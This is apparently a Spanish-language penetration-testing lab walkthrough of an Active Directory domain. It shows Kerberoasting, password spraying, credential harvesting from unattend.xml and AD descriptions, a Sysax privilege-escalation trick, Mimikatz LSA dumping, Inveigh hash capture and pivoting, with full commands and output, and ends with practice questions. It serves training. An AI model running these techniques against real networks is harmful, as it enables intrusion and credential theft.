PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN | Select samaccountname

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

Hay bastantes. Vamos a exportarlos a un archivo CSV para procesarlos sin conexión.

```powershell
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN -verbose | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainUser] Searching for non-null service principal names
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=*))(servicePrincipalName=*))
```

Podemos descargar este archivo mediante la redirección de la unidad RDP que configuramos anteriormente:

```powershell
PS C:\DotNetNuke\Portals\0> copy .\ilfreight_spns.csv \\Tsclient\Home
```

Abrimos el archivo `.csv` con LibreOffice Calc o Excel, extraemos los hashes y los agregamos a un archivo `ilfreight_spns`.&#x20;

{% hint style="warning" %}
Podemos extraer solamente los hashes en un formato para crackearlo con hashcat con `ChatGPT`
{% endhint %}

Ahora podemos ejecutar Hashcat para ver si podemos crackear alguno y, de ser así, si corresponden a cuentas con privilegios.

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt

hashcat (v6.2.6) starting

<SNIP>

$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local*$31b8f218c848bd851df59641a45<SNIP>:lucky7
```

{% endcode %}

Un hash falla, pero al consultar BloodHound, la cuenta `backupjob` no parece sernos útil. Aún podemos anotar otro hallazgo `Weak Kerberos Authentication Configuration (Kerberoasting)` y seguir adelante.

***

## <mark style="color:purple;">Password Spraying</mark>

Otra técnica de movimiento lateral que vale la pena explorar es el Password Spraying. Podemos usar [DomainPasswordSpray.ps1](https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1) o la versión de Windows de Kerbrute desde el host `DEV01`, o usar Kerbrute desde nuestro host de ataque mediante Proxychains (todos con los que vale la pena experimentar).

```powershell
PS C:\DotNetNuke\Portals\0> Import-Module DomainPasswordSpray.ps1
PS C:\DotNetNuke\Portals\0> Invoke-DomainPasswordSpray -Password Welcome1

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2913 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): y
[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2913 users. Current time is 11:47 AM
[*] SUCCESS! User:kdenunez Password:Welcome1
[*] SUCCESS! User:mmertle Password:Welcome1
[*] Password spraying is complete
```

<figure><img src="/files/NnL8fBJT4on1dt0gbkam" alt=""><figcaption></figcaption></figure>

```bash
proxychains kerbrute passwordspray -d inlanefreight.local --dc 172.16.8.3 users.txt Welcome1
```

Encontramos una contraseña válida para dos usuarios más, pero ninguno tiene acceso interesante. Aun así, conviene anotar el hallazgo `Weak Active Directory Passwords` y continuar.

***

## <mark style="color:purple;">Técnicas varias</mark>

Probemos algunas cosas más para cubrir todas las necesidades.&#x20;

### Registry.xml

Podemos buscar en el recurso compartido SYSVOL archivos `Registry.xml` que puedan contener contraseñas de usuarios configurados con inicio de sesión automático mediante la directiva de grupo.

```shell-session
afsh4ck@kali$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86! 
GPP_AUTO... 172.16.8.3      445    DC01             [+] Found SYSVOL share
GPP_AUTO... 172.16.8.3      445    DC01             [*] Searching for Registry.xml
```

Esto no arroja resultados útiles.&#x20;

### Contraseñas en la descripción

A continuación, podemos buscar contraseñas en la `Description` de los campos de usuario de AD, lo cual no es muy común, pero aún lo vemos de vez en cuando (¡incluso he visto contraseñas de cuentas de administrador de dominio y de empresa aquí!).

```powershell
PS C:\DotNetNuke\Portals\0> Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}

samaccountname description
-------------- -----------
Administrator  Built-in account for administering the computer/domain
frontdesk      ILFreightLobby!
Guest          Built-in account for guest access to the computer/d...
krbtgt         Key Distribution Center Service Account
```

Encontramos una para la cuenta `frontdesk`, pero esta tampoco es útil. Cabe destacar que existen múltiples maneras de obtener la contraseña de una cuenta de usuario en este dominio, y existe un host con privilegios RDP otorgados a todos los usuarios del dominio. Aunque estas cuentas no tienen derechos especiales, sería un cliente el que solucionaría estos problemas, ya que un atacante a menudo solo necesita una contraseña para tener éxito en AD.&#x20;

Aquí podemos anotar un hallazgo `Passwords in AD User Description Field` y continuar.

***

## <mark style="color:purple;">Próximos pasos</mark>

En este punto, hemos investigado a fondo el dominio y hemos encontrado varios conjuntos de credenciales, pero nos topamos con un obstáculo. Volviendo a lo básico, podemos ejecutar un análisis para ver si algún host tiene `WinRM` habilitado e intentar conectarnos con cada conjunto de credenciales.

Lo más efectivo es ejecutarlo contra todos los hosts internos que hemos descubierto y que guardamos anteriormente en el archivo `live_hosts`:

```shell-session
afsh4ck@kali$ cat live_hosts

172.16.8.3    <--- Domain Controller
172.16.8.20   <--- Ya comprometido
172.16.8.50   <--- Aún no comprometido
172.16.8.120  <--- Ya comprometido
```

Vemos que tenemos WinRM en todas las máquinas:

```shell-session
afsh4ck@kali$ proxychains nmap -sT -Pn -p 5985 -iL live_hosts                                     

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 02:45 CST

Nmap scan report for 172.16.8.3
Host is up.

PORT     STATE    SERVICE
5985/tcp filtered wsman

Nmap scan report for 172.16.8.20
Host is up.

PORT     STATE    SERVICE
5985/tcp filtered wsman

Nmap scan report for 172.16.8.50
Host is up.

PORT     STATE    SERVICE
5985/tcp filtered wsman

Nmap scan report for 172.16.8.120
Host is up.

PORT     STATE    SERVICE
5985/tcp filtered wsman

Nmap done: 4 IP addresses (4 hosts up) scanned in 2.03 seconds
```

También podemos hacer un escaneo específico de un host en concreto:

```shell-session
afsh4ck@kali$ proxychains nmap -sT -Pn -p 5985 172.16.8.50

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 14:59 EDT
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:80-<--timeout
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
Nmap scan report for 172.16.8.50
Host is up (0.12s latency).

PORT     STATE SERVICE
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

El host `172.16.8.50`, o `MS01` es el único que queda en el que no hemos podido entrar aparte del controlador de dominio, así que vamos a intentarlo usando `evil-winrm` y las credenciales del usuario `backupadm`. que encontramos anteriormente en el archivo `SQL Express Backup.ps1` del recurso compartido `IT/Private/Development`

¡Funciona y estamos dentro!

```shell-session
afsh4ck@kali$ proxychains evil-winrm -i 172.16.8.50 -u backupadm 

ProxyChains-3.1 (http://proxychains.sf.net)
Enter Password: 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents> hostname
ACADEMY-AEN-MS01
```

En este punto, podríamos usar este shell de evil-winrm para enumerar el dominio con una herramienta como PowerView. Ten en cuenta que necesitaremos usar un objeto PSCredential para realizar la enumeración desde este shell debido al problema de "[doble salto" de Kerberos](/ethical-hacking-cheatsheet/active-directory/active-directory/kerberos/kerberos-double-hop.md) . Practica esta técnica y vea qué otras herramientas de enumeración de AD podría usar de esta manera.

Volviendo a la tarea en cuestión. Nuestro usuario no es administrador local y `whoami /priv` no muestra ningún privilegio útil. Al revisar el módulo [`Escalada de privilegios en Windows`](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-windows.md), no encontramos nada interesante, así que buscamos credenciales. Tras investigar un poco, encontramos un archivo `unattend.xml` sobrante de una instalación anterior.

```powershell
*Evil-WinRM* PS C:\Users> Get-ChildItem -Path C:\ -Recurse -Include Unattend.xml, Autounattend.xml -ErrorAction SilentlyContinue -Force |
Select-Object FullName, Length, LastWriteTime

FullName                        Length LastWriteTime
--------                        ------ -------------
C:\panther\unattend.xml           6995 6/1/2022 2:17:25 PM
C:\Windows\Panther\unattend.xml   2357 6/1/2022 12:11:28 PM
```

```powershell
*Evil-WinRM* PS C:\Users\backupadm\desktop> cd c:\panther

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\panther> dir


    Directory: C:\panther


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/1/2022   2:17 PM           6995 unattend.xml
```

Verifiquemos si contiene alguna contraseña, como a veces ocurre.

```xml
*Evil-WinRM* PS C:\panther> type unattend.xml

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="oobeSystem">
        <component name="Microsoft-Windows-International-Core" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <InputLocale>de-de</InputLocale>
            <SystemLocale>de-de</SystemLocale>
            <UILanguage>de-de</UILanguage>
            <UILanguageFallback>de-de</UILanguageFallback>
            <UserLocale>de-de</UserLocale>
        </component>
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <OOBE>
                <HideEULAPage>true</HideEULAPage>
                <HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>
                <NetworkLocation>Work</NetworkLocation>
                <ProtectYourPC>1</ProtectYourPC>
            </OOBE>
            <AutoLogon>
                <Password>
                    <Value>Sys26Admin</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>1</LogonCount>
                <Username>ilfserveradm</Username>
            </AutoLogon>
        
        <SNIP>

        </component>
    </settings>
</unattend>
```

Encontramos las credenciales del usuario local `ilfserveradm`, con la contraseña `Sys26Admin`.

```powershell
*Evil-WinRM* PS C:\panther> net user ilfserveradm

User name                    ilfserveradm
Full Name                    ilfserveradm
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2022 2:17:17 PM
Password expires             Never
Password changeable          6/1/2022 2:17:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/1/2022 2:17:17 PM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users
Global Group memberships     *None
The command completed successfully.
```

Este no es un usuario de dominio, pero es interesante que tenga acceso a Escritorio remoto, pero no sea miembro del grupo de administradores locales. Accedamos mediante RDP y veamos qué podemos hacer. Tras acceder mediante RDP y realizar una enumeración adicional, encontramos software no estándar instalado en el directorio `C:\Program Files (x86)\SysaxAutomation`.

```bash
ssh -i dmz01_key -L 13389:172.16.8.50:3389 root@10.129.44.66
```

```bash
xfreerdp /v:127.0.0.1:13389 /u:ilfserveradm /p:Sys26Admin /drive:home,"/home/kali/Escritorio/hack-tools/Windows/AD-Tools"
```

<figure><img src="/files/dwHXiVqDIIM4xTYxwNPg" alt=""><figcaption></figcaption></figure>

Una búsqueda rápida revela [este](https://www.exploit-db.com/exploits/50834) exploit de escalada de privilegios local. Según la descripción, este Servicio Programado Sysax se ejecuta como la cuenta local SYSTEM y permite a los usuarios crear y ejecutar trabajos de copia de seguridad. Si se elimina la opción de ejecutar como usuario, la tarea se ejecutará de forma predeterminada como la cuenta SYSTEM. ¡Hagamos una prueba!

Primero, creamos un archivo llamado `pwn.bat` en `C:\Users\ilfserveradm\Documents` que contenga la línea `net localgroup administrators ilfserveradm /add` para agregar a nuestro usuario al grupo de administradores locales (en ocasiones, necesitaremos corregirlo y anotarlo en los apéndices de nuestro informe). A continuación, podemos realizar los siguientes pasos:

* Abrimos `C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe`
* Seleccionamos `Setup Scheduled/Triggered Tasks`
* Add Task (Triggered)
* Folder to monitor `C:\Users\ilfserveradm\Documents`
* Activamos `Run task if a file is added to the monitor folder or subfolder(s)`
* Elegimos `Run any other Program` y elegimos `C:\Users\ilfserveradm\Documents\pwn.bat`
* Desmarcamos `Login as the following user to run task`
* Hacemos clic en `Finish` y luego `Save`

{% hint style="success" %}
Podéis ver las imágenes del proceso en la [pregunta 3](#pregunta-3) del caso práctico al final de esta sección.
{% endhint %}

Finalmente, para activar la tarea, creamos un nuevo archivo .txt en el directorio `C:\Users\ilfserveradm\Documents`. Podemos comprobar que el usuario `ilfserveradm` se ha añadido al grupo `Administrators`.

```cmd-session
C:\Users\ilfserveradm> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
ilfserveradm
INLANEFREIGHT\Domain Admins
The command completed successfully.
```

***

## <mark style="color:purple;">Post-explotación / Looting</mark>

A continuación, realizaremos una post-explotación en el host `MS01`. Observamos un par de archivos interesantes en la raíz de la unidad `c:\ budget_data.xlsx`, `Inlanefreight.kdbx` que merecería la pena revisar y, posiblemente, informar al cliente si no se encuentran en la ubicación prevista. A continuación, podemos usar Mimikatz, para elevar a un token `NT AUTHORITY\SYSTEM` y volcar los LSA Secrets.

```cmd-session
c:\Users\ilfserveradm\Documents> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::secrets
Domain : ACADEMY-AEN-MS0
SysKey : 61b3d49a6205a1dedb14591c22d36afc
ERROR kuhl_m_lsadump_secretsOrCache ; kull_m_registry_RegOpenKeyEx (SECURITY) (0x00000005)

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

564     {0;000003e7} 1 D 30073          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0136075a} 2 F 20322234    ACADEMY-AEN-MS0\ilfserveradm    S-1-5-21-1020326033-369054202-3290056218-1002   (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 20387820    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::secrets
Domain : ACADEMY-AEN-MS0
SysKey : 61b3d49a6205a1dedb14591c22d36afc

Local name : ACADEMY-AEN-MS0 ( S-1-5-21-1020326033-369054202-3290056218 )
Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
Domain FQDN : INLANEFREIGHT.LOCAL

Policy subsystem is : 1.18
LSA Key(s) : 1, default {13764b01-b89c-8adf-69ec-8937ee43821e}
  [00] {13764b01-b89c-8adf-69ec-8937ee43821e} 587be7dcfb75bb9ebb0c5c75cf4afb4488e602f9926f3404a09ecf8ba20b04e7

Secret  : $MACHINE.ACC
cur/text: -2d"GC)[+6,[+mC+UC5KXVoH>j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(<7tZW"I\7`,Bu#]N$'%A`$Z?E@9V2zdh=
    NTLM:ced50a6f3cb256110200dcb022b32c12
    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8
old/text: -2d"GC)[+6,[+mC+UC5KXVoH>j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(<7tZW"I\7`,Bu#]N$'%A`$Z?E@9V2zdh=
    NTLM:ced50a6f3cb256110200dcb022b32c12
    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8

Secret  : DefaultPassword
cur/text: DBAilfreight1!

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 37 62 35 26 80 4c 6b 2f 11 ca 06 25 ab 97 21 3f 84 f8 74 fa bc 69 a1 c4 37 2b df f8 cd 6c 8f 0a 8a d9 67 e9 42 cf 4f 96
    full: 37623526804c6b2f11ca0625ab97213f84f874fabc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
    m/u : 37623526804c6b2f11ca0625ab97213f84f874fa / bc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
old/hex : 01 00 00 00 51 9c 86 b4 cb dc 97 8b 35 9b c0 39 17 34 16 62 31 98 c1 07 ce 7d 9f 94 fc e7 2c d9 59 8a c6 07 10 78 7c 0d 9a 56 ce 0b
    full: 519c86b4cbdc978b359bc039173416623198c107ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
    m/u : 519c86b4cbdc978b359bc039173416623198c107 / ce7d9f94fce72cd9598ac60710787c0d9a56ce0b

Secret  : NL$KM
cur/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
```

Encontramos una contraseña establecida, pero no un nombre de usuario asociado. Parece ser una cuenta configurada con inicio de sesión automático, por lo que podemos consultar el Registro para encontrar el nombre de usuario.

```powershell
PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"

DefaultUserName : mssqladm
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
                  NT\CurrentVersion\Winlogon\
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
PSChildName     : Winlogon
PSDrive         : HKLM
PSProvider      : Microsoft.PowerShell.Core\Registry
```

Ahora tenemos un nuevo par de credenciales: `mssqladm:DBAilfreight1!`.

Antes de continuar, revisemos si hay otras credenciales. Vemos que Firefox está instalado, así que podemos usar la [herramienta LaZagne](https://github.com/AlessandroZ/LaZagne) para intentar recuperar las credenciales guardadas en el navegador. No hubo suerte, pero siempre vale la pena revisarlo.

```cmd-session
c:\Users\ilfserveradm\Documents> lazagne.exe browsers -firefox

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 6f898230-c272-4f85-875c-9f7b354ce485
[+] System masterkey decrypted for 9ccbb5e8-66c9-4210-a46c-a72e8f750734
[+] System masterkey decrypted for 08ed962e-44d9-4e2c-9985-392b699c25ae
[+] System masterkey decrypted for d4bfcc8b-5eec-485d-8adb-9ed4ae5656d6

[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.29700016975
```

También vale la pena ejecutar [Inveigh](https://github.com/Kevin-Robertson/Inveigh) una vez que tengamos administrador local en un host para ver si podemos obtener hashes de contraseñas para cualquier usuario.

```powershell
PS C:\Users\ilfserveradm\Documents> Import-Module .\Inveigh.ps1
PS C:\Users\ilfserveradm\Documents> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-06-22T15:03:32
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.8.50
[+] Spoofer IP Address = 172.16.8.50
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer = Disabled
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Users\ilfserveradm\Documents
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
[+] [2022-06-22T15:04:05] TCP(445) SYN packet detected from 172.16.8.20:55623
[+] [2022-06-22T15:04:05] SMB(445) negotiation request detected from 172.16.8.20:55623
[+] [2022-06-22T15:04:05] Domain mapping added for INLANEFREIGHT to INLANEFREIGHT.LOCAL
[+] [2022-06-22T15:04:05] SMB(445) NTLM challenge 5EB0B310E7B8BA04 sent to 172.16.8.20:55623
[+] [2022-06-22T15:04:05] SMB(445) NTLMv2 captured for ACADEMY-AEN-DEV\mpalledorous from 172.16.8.20(ACADEMY-AEN-DEV):55623:
mpalledorous::ACADEMY-AEN-DEV:5EB0B310E7B8BA04:<SNIP>
```

***

## <mark style="color:purple;">Acercándonos</mark>

Hemos enumerado el dominio por completo, nos hemos movido lateralmente y hemos saqueado lo que pudimos encontrar en los hosts objetivo. En este punto, tenemos las credenciales del usuario `mssqladm` y podemos seguir buscando una ruta para comprometer el dominio.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.229.147
```

### Pregunta 1

> Busca un script de backup que contenga la contraseña del usuario `backupadm`. Indica la contraseña de este usuario como respuesta.

#### Configuración de pivoting con SSH

Este comando nos permite enviar todo el tráfico RDP del host `DEV01` al host `dmz01` a través del puerto local 13389 para conectarnos por RDP:

```shell-session
afsh4ck@kali$  ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.229.147
```

#### Conexión por RDP

```shell-session
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/kali/Escritorio/hack-tools/WINDOWS"
```

Configurar la ruta donde están los scripts de enumeración como `PowerView.ps1` en nuestro equipo atacante. Solo tenemos una shell:

<figure><img src="/files/0hhA47PJRFz4ZsYzQER3" alt=""><figcaption></figcaption></figure>

#### Análisis con Bloodhound

<pre class="language-powershell"><code class="lang-powershell">C:\Users\hporter> net use
New connections will be remembered.

Status       Local     Remote                    Network
-------------------------------------------------------------------------------
                       \\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.

<strong>c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\SharpHound.exe .
</strong>        1 file(s) copied.

c:\DotNetNuke\Portals\0> SharpHound.exe
2025-04-24T12:01:07.2980913-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-04-24T12:01:07.4699649-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-04-24T12:01:07.5012162-07:00|INFORMATION|Initializing SharpHound at 12:01 PM on 4/24/2025
2025-04-24T12:01:07.5793350-07:00|INFORMATION|Resolved current domain to INLANEFREIGHT.LOCAL
2025-04-24T12:01:07.7512280-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-04-24T12:01:07.8449629-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2025-04-24T12:01:08.4074627-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for INLANEFREIGHT.LOCAL
2025-04-24T12:01:08.4074627-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for INLANEFREIGHT.LOCAL
&#x3C;---SNIP--->
Closing writers
2025-04-24T12:01:11.1574925-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2025-04-24T12:01:11.3293459-07:00|INFORMATION|Status: 3841 objects finished (+3841 1280.333)/s -- Using 76 MB RAM
2025-04-24T12:01:11.3293459-07:00|INFORMATION|Enumeration finished in 00:00:03.4973059
2025-04-24T12:01:11.6105930-07:00|INFORMATION|Saving cache with stats: 19 ID to type mappings.
 1 name to SID mappings.
 2 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-04-24T12:01:11.6418778-07:00|INFORMATION|SharpHound Enumeration Completed at 12:01 PM on 4/24/2025! Happy Graphing!
</code></pre>

Buscando nuestro usuario `hporter` y seleccionando `First Degree Object Control`, podemos ver que el usuario tiene derechos `ForceChangePassword` sobre el usuario `ssmalls`.

<figure><img src="/files/XoPoD3dBk2yqd7Bdwp56" alt=""><figcaption></figcaption></figure>

#### Descargar PowerView

En la ruta `c:\DotNetNuke\Portals\0` comprobamos con `net use` la ubicación de nuestra unidad redirigida y luego transferimos la herramienta:

```
c:\DotNetNuke\Portals\0> net use

New connections will be remembered.

Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.


c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\PowerView.ps1 .
        1 file(s) copied.
```

#### Cambiar contraseña del usuario Smalls con PowerView

```powershell
PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1

PS C:\DotNetNuke\Portals\0> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose

VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'ssmalls'
VERBOSE: [Set-DomainUserPassword] Password for user 'ssmalls' successfully reset
```

#### Conexión por RDP con el usuario smalls y la nueva contraseña

```
xfreerdp /v:127.0.0.1:13389 /u:ssmalls /p:Str0ngpass86! /drive:home,"/home/kali/Escritorio/hack-tools/WINDOWS"
```

Vemos que funciona, por lo que la contraseña se ha cambiado perfectamente.

#### Enumerar recursos compartidos

```
c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\Snaffler.exe
        1 file(s) copied.

c:\DotNetNuke\Portals\0> Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


2022-06-22 10:57:33 -07:00 [Share] {Green}(\\DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-06-22 10:57:36 -07:00 [Share] {Black}(\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-06-22 10:57:36 -07:00 [Share] {Black}(\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\C$)
Press any key to exit.
```

Con Snaffler encontramos varios recursos compartidos que pueden contener credenciales. Vamos a conectarnos por SMB a `Department Shares` configurando correctamente el pivoting:

```shell-session
afsh4ck@kali$ ssh -D 8081 -i dmz01_key root@10.129.229.147
```

```shell-session
afsh4ck@kali$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' 

ProxyChains-3.1 (http://proxychains.sf.net)
